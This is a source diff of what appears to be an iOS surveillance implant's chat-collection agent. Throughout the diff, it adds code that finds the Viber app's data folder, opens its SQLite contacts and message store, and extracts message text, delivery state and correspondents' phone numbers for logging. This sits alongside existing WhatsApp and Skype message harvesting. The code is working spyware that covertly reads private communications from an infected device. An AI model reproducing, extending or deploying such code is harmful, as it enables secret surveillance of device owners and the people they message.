@@ -33,6 +33,12 @@
 #define DIALOG_PART_POS   2
 #define ID_POS            3
 
+// Viber sql positions
+#define VIBER_PK_POS      0
+#define VIBER_TEXT_POS    1
+#define VIBER_STATE_POS   2
+#define VIBER_PHONE_POS   3
+
 static BOOL gWahtAppContactGrabbed = NO;
 
 #pragma mark -
@@ -158,6 +164,7 @@ foundCharacters:(NSString *)string
       mLastMsgPK = 0;
       mLastWAMsgPk = 0;
       mLastSkMsgPk = 0;
+      mLastVbMsgPk = 0;
       mAgentID = AGENT_IM;
       mWADbPathName = nil;
       mWAUsername = @"";
@@ -167,7 +174,6 @@ foundCharacters:(NSString *)string
     
     return self;
 }
-
 #pragma mark -
 #pragma mark Skype Support methods
 #pragma mark -
@@ -270,6 +276,115 @@ foundCharacters:(NSString *)string
   
   return bRet;
 }
+
+- (BOOL)isThereSkype
+{
+  return [self setSkDbPathName];
+}
+
+#pragma mark -
+#pragma mark Viber Support methods
+#pragma mark -
+
+- (NSString*)getVbRootPathName
+{
+  NSString *rootPath = nil;
+  
+  NSArray *usrAppFirstLevelPath =
+  [[NSFileManager defaultManager] contentsOfDirectoryAtPath:USER_APPLICATIONS_PATH
+                                                      error:nil];
+  
+  if (usrAppFirstLevelPath == nil || [self isThreadCancelled] == TRUE)
+    return  rootPath;
+  
+  for (int i=0; i < [usrAppFirstLevelPath count]; i++)
+  {
+    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+    
+    if ([self isThreadCancelled] == TRUE)
+    {
+      [pool release];
+      return  rootPath;
+    }
+    
+    NSString *tmpPath = [NSString stringWithFormat:@"%@/%@/Viber.app",
+                         USER_APPLICATIONS_PATH,
+                         [usrAppFirstLevelPath objectAtIndex:i]];
+    
+    if ([[NSFileManager defaultManager] fileExistsAtPath: tmpPath] == TRUE)
+    {
+      rootPath = [NSString stringWithFormat:@"%@/%@",
+                  USER_APPLICATIONS_PATH,
+                  [usrAppFirstLevelPath objectAtIndex:i]];
+      
+      if ([[NSFileManager defaultManager] fileExistsAtPath: rootPath] == FALSE)
+      {
+        //[rootPath release];
+        rootPath = nil;
+      }
+      else
+      {
+        [rootPath retain];
+        [pool release];
+        break;
+      }
+    }
+    
+    [pool release];
+  }
+  
+  return rootPath;
+}
+
+- (void)setVbUserName
+{
+  if ([self isThreadCancelled] == TRUE)
+    return;
+  
+  NSString *tmpMyPhone = [[_i_Utils sharedInstance] getPhoneNumber];
+
+  if (tmpMyPhone != nil)
+    mVbUsername = [tmpMyPhone retain];
+}
+
+- (BOOL)setVbDbPathName
+{
+  BOOL bRet = FALSE;
+  
+  if ([self isThreadCancelled] == TRUE)
+    return  FALSE;
+  
+  if (mVbDbPathName != nil)
+    return TRUE;
+  
+  NSString *rootPath = [self getVbRootPathName];
+  
+  [self setVbUserName];
+  
+  if (rootPath != nil && mVbUsername != nil)
+  {
+    mVbDbPathName = [[NSString alloc] initWithFormat:@"%@/Documents/Contacts.data",
+                                                     rootPath];
+    
+    [rootPath release];
+    
+    if ([[NSFileManager defaultManager] fileExistsAtPath: mVbDbPathName] == TRUE)
+      bRet = TRUE;
+    else
+    {
+      [mVbDbPathName release];
+      mVbDbPathName = nil;
+    }
+  }
+  
+  return bRet;
+}
+
+- (BOOL)isThereViber
+{
+  return [self setVbDbPathName];
+}
+
 #pragma mark -
 #pragma mark WhatsApp Support methods
 #pragma mark -
@@ -287,6 +402,7 @@ foundCharacters:(NSString *)string
     NSNumber *tmplaskpk =   [tmpDict objectForKey: @"lastpk"];
     NSNumber *tmpWALastPK = [tmpDict objectForKey: @"WAlastpk"];
     NSNumber *tmpSkLastPK = [tmpDict objectForKey: @"Sklastpk"];
+    NSNumber *tmpVbLastPK = [tmpDict objectForKey: @"Vblastpk"];
     
     if (tmplaskpk != nil)
       mLastMsgPK = [tmplaskpk intValue];
@@ -296,6 +412,9 @@ foundCharacters:(NSString *)string
     
     if (tmpSkLastPK != nil)
       mLastSkMsgPk = [tmpSkLastPK intValue];
+    
+    if (tmpVbLastPK != nil)
+      mLastVbMsgPk = [tmpVbLastPK intValue];
   }
   
   [pool release];
@@ -306,11 +425,13 @@ foundCharacters:(NSString *)string
   NSNumber *tmpLastPK = [NSNumber numberWithInt: mLastMsgPK];
   NSNumber *tmpWALastPK = [NSNumber numberWithInt: mLastWAMsgPk];
   NSNumber *tmpSkLastPK = [NSNumber numberWithInt: mLastSkMsgPk];
+  NSNumber *tmpVbLastPK = [NSNumber numberWithInt: mLastVbMsgPk];
   NSString *chatClassKey = [[self class] description];
   
-  NSDictionary *tmpDict = [NSDictionary dictionaryWithObjectsAndKeys:tmpLastPK, @"lastpk",
+  NSDictionary *tmpDict = [NSDictionary dictionaryWithObjectsAndKeys:tmpLastPK,   @"lastpk",
                                                                      tmpWALastPK, @"WAlastpk",
-                                                                     tmpSkLastPK, @"Sklastpk",nil];
+                                                                     tmpSkLastPK, @"Sklastpk",
+                                                                     tmpVbLastPK, @"Vblastpk",nil];
   
   [[_i_Utils sharedInstance] setPropertyWithName: chatClassKey withDictionary: tmpDict];
 }
@@ -429,6 +550,11 @@ foundCharacters:(NSString *)string
   }
 
   return bRet;
+}
+
+- (BOOL)isThereWahtsApp
+{
+  return [self setWADbPathName];
 }
 
 - (void)logWhatsAppContacts:(NSString*)contact
@@ -562,11 +688,11 @@ foundCharacters:(NSString *)string
 - (NSMutableArray*)getSkChatMessagesFormDB:(sqlite3*)theDB
                                   withDate:(int)theDate
 {
-  NSMutableArray *retArray = [NSMutableArray arrayWithCapacity:0];
+  NSNumber *flags = nil;
   char wa_msg_query[256];
+  NSMutableArray *retArray = nil;
   sqlite3_stmt *compiledStatement;
   NSNumber *type = [NSNumber numberWithInt:0x00000001];
-  NSNumber *flags = nil;
   
   char _wa_msg_query[] =
   "select body_xml, author, dialog_partner, id from Messages where id >";
@@ -601,6 +727,98 @@ foundCharacters:(NSString *)string
                                                                              sndr != nil ? sndr : @" ", @"sender",
                                                                              type,  @"type",
                                                                              flags, @"flags", nil];
+          
+          if (retArray == nil)
+            retArray = [NSMutableArray arrayWithCapacity:0];
+          
+          [retArray addObject: tmpDict];
+          
+        }
+      }
+    }
+    
+    sqlite3_finalize(compiledStatement);
+  }
+  
+  return retArray;
+}
+#pragma mark -
+#pragma mark Viber SQLITE3 stuff
+#pragma mark -
+
+- (void)closeVbChatDB:(sqlite3*)db
+{
+  if (db != NULL)
+    sqlite3_close(db);
+}
+
+- (sqlite3*)openVbChatDB
+{
+  sqlite3 *db = NULL;
+  
+  if ([self isThreadCancelled] == TRUE || mVbUsername == nil || mVbDbPathName == nil)
+  {
+    return db;
+  }
+  
+  sqlite3_open([mVbDbPathName UTF8String], &db) ;
+  
+  return db;
+}
+
+- (NSMutableArray*)getVbChatMessagesFormDB:(sqlite3*)theDB
+                                  withDate:(int)theDate
+{
+  NSNumber *flags = nil;
+  char wa_msg_query[512];
+  NSMutableArray *retArray = nil;
+  sqlite3_stmt *compiledStatement;
+  NSNumber *type = [NSNumber numberWithInt:0x00000004]; // temporaneo: da mettere in db
+  
+  char _wa_msg_query[] =
+  "select zvibermessage.z_pk, zvibermessage.ztext, zvibermessage.zstate, zphonenumberindex.zphonenum from zvibermessage inner join z_3phonenumindexes on z_3phonenumindexes.z_3conversations =  zvibermessage.zconversation inner join zphonenumberindex on zphonenumberindex.z_pk = z_3phonenumindexes.z_5phonenumindexes where zvibermessage.z_pk >";
+  
+  sprintf(wa_msg_query, "%s %d", _wa_msg_query, theDate);
+  
+  if(sqlite3_prepare_v2(theDB, wa_msg_query, -1, &compiledStatement, NULL) == SQLITE_OK)
+  {
+    while(sqlite3_step(compiledStatement) == SQLITE_ROW)
+    {
+      int pk = sqlite3_column_int(compiledStatement, VIBER_PK_POS);
+      
+      if (pk > mLastVbMsgPk)
+      {
+        mLastVbMsgPk = pk;
+        NSString *peer;
+        NSString *sndr;
+        
+        NSString *text = [self getSqlString:compiledStatement colNum:VIBER_TEXT_POS];
+        
+        if (text != nil)
+        {
+          NSString *state =[self getSqlString:compiledStatement colNum:VIBER_STATE_POS];
+          
+          if ([state compare: @"delivered"] == NSOrderedSame)
+          {
+            flags = [NSNumber numberWithInt:0x00000001];
+            peer = [self getSqlString:compiledStatement colNum:VIBER_PHONE_POS];
+            sndr = mVbUsername;
+          }
+          else
+          {
+            flags = [NSNumber numberWithInt:0x00000000];
+            peer = mVbUsername;
+            sndr = [self getSqlString:compiledStatement colNum:VIBER_PHONE_POS];
+          }
+          
+          NSDictionary *tmpDict = [NSDictionary dictionaryWithObjectsAndKeys:text, @"text",
+                                                                             peer != nil ? peer : @" ", @"peers",
+                                                                             sndr != nil ? sndr : @" ", @"sender",
+                                                                             type,  @"type",
+                                                                             flags, @"flags", nil];
+          
+          if (retArray == nil)
+            retArray = [NSMutableArray arrayWithCapacity:0];
           
           [retArray addObject: tmpDict];
           
@@ -862,11 +1080,11 @@ foundCharacters:(NSString *)string
 - (NSMutableArray*)getWAChatMessagesFormDB:(sqlite3*)theDB
                                   withDate:(int)theDate
 {
-  NSMutableArray *retArray = [NSMutableArray arrayWithCapacity:0];
+  NSNumber *flags = nil;
   char wa_msg_query[256];
+  NSMutableArray *retArray = nil;
   sqlite3_stmt *compiledStatement;
   NSNumber *type = [NSNumber numberWithInt:0x00000006];
-  NSNumber *flags = nil;
   
   char _wa_msg_query[] =
     "select ZTEXT, ZISFROMME, ZGROUPMEMBER, ZFROMJID, ZTOJID, Z_PK, ZCHATSESSION from ZWAMESSAGE where ZMESSAGEDATE >";
@@ -900,6 +1118,8 @@ foundCharacters:(NSString *)string
                                                                              sndr,  @"sender",
                                                                              type,  @"type",
                                                                              flags, @"flags",nil];
+          if (retArray == nil)
+            retArray = [NSMutableArray arrayWithCapacity:0];
           
           [retArray addObject: tmpDict];
       
@@ -1112,6 +1332,33 @@ foundCharacters:(NSString *)string
 }
 
 #pragma mark -
+#pragma mark Viber chat
+#pragma mark -
+
+- (NSMutableArray*)getVbChats
+{
+  sqlite3 *db;
+  NSMutableArray *chatArray = nil;
+  
+  if ([self isThreadCancelled] == TRUE)
+  {
+    return chatArray;
+  }
+  
+  if ((db = [self openVbChatDB]) == NULL)
+  {
+    sqlite3_close(db);
+    return chatArray;
+  }
+  
+  chatArray = [self getVbChatMessagesFormDB:db withDate:mLastVbMsgPk];
+  
+  [self closeVbChatDB: db];
+  
+  return chatArray;
+}
+
+#pragma mark -
 #pragma mark Whatsapp chat
 #pragma mark -
 
@@ -1175,6 +1422,7 @@ foundCharacters:(NSString *)string
   
   NSMutableArray *waChats = nil;
   NSMutableArray *skChats = nil;
+  NSMutableArray *vbChats = nil;
   
   if ([self isThreadCancelled] == TRUE)
   {
@@ -1187,9 +1435,16 @@ foundCharacters:(NSString *)string
   
   waChats = [self getWAChats];
 
-  [self writeChatLogs: waChats];
+  vbChats = [self getVbChats];
+  
+  if (waChats != nil)
+    [self writeChatLogs:waChats];
 
-  [self writeChatLogs:skChats];
+  if (skChats != nil)
+    [self writeChatLogs:skChats];
+  
+  if (vbChats != nil)
+    [self writeChatLogs:vbChats];
   
   [pool release];
 }
@@ -1213,8 +1468,12 @@ foundCharacters:(NSString *)string
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
+  BOOL bSkype = [self isThereSkype];
+  BOOL bViber = [self isThereViber];
+  BOOL bWhatsApp = [self isThereWahtsApp];
+  
   if ([self isThreadCancelled] == TRUE ||
-      ([self setWADbPathName] == FALSE && [self setSkDbPathName] == FALSE))
+      (bSkype == FALSE && bViber == FALSE && bWhatsApp == FALSE))
   {
     [self setMAgentStatus:AGENT_STATUS_STOPPED];
     [outerPool release];
@@ -1233,8 +1492,8 @@ foundCharacters:(NSString *)string
   {
     NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
     
-    [[NSRunLoop currentRunLoop] runMode: k_i_AgentChatRunLoopMode 
-                             beforeDate: [NSDate dateWithTimeIntervalSinceNow: 1.00]];
+    [[NSRunLoop currentRunLoop] runMode:k_i_AgentChatRunLoopMode
+                             beforeDate:[NSDate dateWithTimeIntervalSinceNow: 1.00]];
     
     [innerPool release];
   }
